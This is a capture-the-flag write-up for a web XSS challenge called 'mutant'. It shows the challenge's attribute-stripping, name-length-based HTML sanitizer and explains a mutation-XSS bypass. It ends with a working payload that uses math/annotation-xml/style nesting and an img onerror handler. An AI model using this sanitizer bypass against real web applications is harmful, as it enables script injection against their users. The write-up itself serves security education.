# 🏷️ mutant

**Category:** Web  
**Description:**  
> Just an XSS. What more is there to it?

----
<img/src='https://github.com/Yazan03/CTF-writeups2025/blob/main/DU%20CTF/mutant/images/1.PNG?raw=true'>

<br></br>

**index.js**
```js
const inp = new URLSearchParams(location.search).get("input");

// Reporting stuff
reportbtn.addEventListener('click', () => {
  fetch("/report", {
    method: "POST",
    body: inp
  }).then(r => alert("Successfully reported")).catch(alert);
});

// Challenge
mytextarea.value = inp;

console.log("Original", inp);

const t = document.createElement("template");
t.innerHTML = inp;

console.log("After injecting into template", t.innerHTML);

const nodes = [t.content];
while (nodes.length > 0) {
  const n = nodes.pop();

  console.log("Parsed element", n.outerHTML);

  if (n.attributes) {
    while (n.attributes.length > 0) {
      n.removeAttribute(n.attributes[0].name);
    }
  }

  // Fix XSS reported by our bug bounty community
  if (n.nodeName !== "#document-fragment" && (n.nodeName.length === 6 || n.nodeName.length === 8)) {
    n.parentNode.removeChild(n);
    continue;
  }
  
  for (let i = n.children.length - 1; i >= 0; i--) {
    nodes.push(n.children[i]);
  }
}

console.log("After sanitization", t.innerHTML);

myoutputdebug.innerText = t.innerHTML;
myoutput.innerHTML = t.innerHTML;

console.log("Final", myoutput.innerHTML);
```

This is the sanitization process : 


```js
const nodes = [t.content];
while (nodes.length > 0) {
  const n = nodes.pop();
  console.log("Parsed element", n.outerHTML);

  if (n.attributes) {
    while (n.attributes.length > 0) {
      n.removeAttribute(n.attributes[0].name);
    }
  }

  // Fix XSS reported by our bug bounty community
  if (n.nodeName !== "#document-fragment" && (n.nodeName.length === 6 || n.nodeName.length === 8)) {
    n.parentNode.removeChild(n);
    continue;
  }
  
  for (let i = n.children.length - 1; i >= 0; i--) {
    nodes.push(n.children[i]);
  }
}
```


Iterates through the fragment’s nodes recursively.

Removes all attributes from each element.

Then tries to remove some elements based on nodeName.length:
```js
if (n.nodeName !== "#document-fragment" && (n.nodeName.length === 6 || n.nodeName.length === 8))
```

As we can see that the length is not a problem because there is some payloads we can use such as svg, img, ... etc.

Testing some stuff didn't worked then i tried some mutation XSS like `<table><h1>hello</h1></table>`

and the result was `<h1>hello</h1><table></table>`

Then i tried to construct a valid payload and got a working on :

```
<math><annotation-xml encoding="text/html"><style><img src onerror=alert(origin)>
```




